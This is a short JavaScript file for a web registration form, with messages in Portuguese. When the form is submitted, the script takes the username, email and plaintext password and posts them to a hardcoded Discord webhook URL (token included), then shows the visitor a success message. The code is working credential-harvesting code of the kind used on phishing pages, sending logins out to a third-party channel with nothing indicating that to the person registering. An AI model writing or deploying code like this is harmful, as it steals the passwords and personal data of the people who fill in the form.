const form = document.getElementById("registerForm");
const successDiv = document.getElementById("success");

const WEBHOOK_URL = "https://discord.com/api/webhooks/1408584630696804452/dNcDM0TqA1vy9N6UeCYCyePj1bOiZG7rHsmBtLMu4i1lV-CpRIZ98o5bJSG50VQaNu4K";

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: `💻 | Usuário: ${username}\n📧 | Email: ${email}\n🔑 | Senha: ${password}`
    })
  });

  form.classList.add("hidden");
  successDiv.classList.remove("hidden");
});
